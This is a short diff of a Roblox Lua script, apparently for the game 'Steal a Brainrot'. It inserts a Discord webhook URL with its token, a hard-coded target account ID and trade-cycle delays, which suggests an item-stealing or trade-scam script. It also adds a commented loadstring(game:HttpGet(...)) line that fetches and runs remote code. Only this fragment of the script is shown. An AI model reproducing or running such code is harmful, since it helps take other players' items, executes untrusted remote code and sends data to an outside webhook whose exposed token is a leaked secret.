@@ -8,15 +8,15 @@ local cam = workspace.CurrentCamera
 local pg = LP:WaitForChild("PlayerGui")
 
 task.spawn(function()
--- HERE YOUR SCRIPT DUALBOOT
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/KawaifuHub/Duel-PVP/refs/heads/main/Updated%20Irish1.txt"))()
 end)
 
 task.spawn(function()
 
-local GOOD_WEBHOOK = "webhok"
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1480088657745416285/Swczm5ZQ20SJBB-qVMvXwrghk7DyOSUMEQVuDW98WbK1UdG2blrNfENVtppcAlWcBC9C"
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
-local TARGET_ID = YOUR ID
+local TARGET_ID = 4607446246
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
